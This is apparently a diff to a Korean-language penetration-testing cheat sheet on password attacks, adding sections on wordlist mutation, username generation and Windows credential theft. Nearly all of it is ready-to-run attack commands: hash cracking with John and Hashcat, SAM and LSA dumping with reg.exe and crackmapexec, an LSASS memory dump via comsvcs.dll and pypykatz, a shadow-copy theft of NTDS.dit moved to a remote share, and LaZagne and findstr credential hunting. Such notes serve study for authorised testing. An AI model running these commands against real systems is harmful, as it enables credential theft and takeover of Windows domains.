@@ -34,6 +34,7 @@ john --wordlist=<wordlist.txt> server_doc.hash
 | `wpa2john`              | Converts WPA/WPA2 handshakes for John         |
 
 - 툴 위치 검색 : ```$ locate *2john*```
+
 <br/><br/>
 # Remote Password Attacks
 
@@ -63,11 +64,13 @@ john --wordlist=<wordlist.txt> server_doc.hash
 ### Smbclient
 ```smbclient -U user \\\\192.168.1.1\\SHARENAME```
 
+<br/><br/>
 # Password 변형
 
 ### Hashcat Rule 기반 Wordlist 생성
 ```
-$ cat custom.rule
+ls /usr/share/hashcat/rules/
+cat custom.rule
 
 :
 c
@@ -87,11 +90,13 @@ $! c so0 sa@
 ```
 ```hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list```
 
-### Hashcat Rule
-```ls /usr/share/hashcat/rules/```
-
 ### CeWL를 이용한 Wordlist 생성
 ```cewl https://www.domain.com -d 4 -m 6 --lowercase -w inlane.wordlist```
+
+### Anarchy를 이용한 Custom Username 생성
+```./username-anarchy -i /home/user/names.txt```<br/>
+예) ```./username-anarchy john marston > username.txt```
+
 <br/><br/>
 # Password 재사용 / 기본 Passwords
 
@@ -136,10 +141,11 @@ $! c so0 sa@
 
 ### Default Credentials
 [Default Router Credentials](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)
+
 <br/><br/>
 # Windows Local Password Attacks
 
-### Attacking SAM
+## Attacking SAM
 #### reg.exe로 Registry Hives 복사
 ```
 reg.exe save hklm\sam C:\sam.save
@@ -155,8 +161,39 @@ secretsdump 출력 : (uid:rid:lmhash:nthash)
 ```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```
 
 ### Remote Dumping
-```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```
-```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```
+```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```<br/>
+```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```<br/>
 
+<br/><br/>
+## Attacking Lsass
+### PowerShell을 이용한 lsass.dmp
+```
+Get-Process lsass
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
+```
 
+### Pypykatz를 사용하여 LSASS 프로세스 덤프
+```pypykatz lsa minidump ./lsass.dmp```
+<br/><br/>
+## Attacking NTDS.dit
+### Evil-WinRM, Vssadmin를 이용한 NTDS.dit 복사
+```
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\192.168.1.1\Share
+```
 
+### Crackmapexec를 이용한 NTDS.dit 덤프
+```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --ntds```
+
+<br/><br/>
+## 자격증명 검색
+
+### Lazagne 사용하여 자격증명 검색
+```start lazagne.exe all```
+
+### findstr 사용하여 자격증명 검색
+```findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml```
+
+<br/><br/>
+# Linux Local Password Attacks
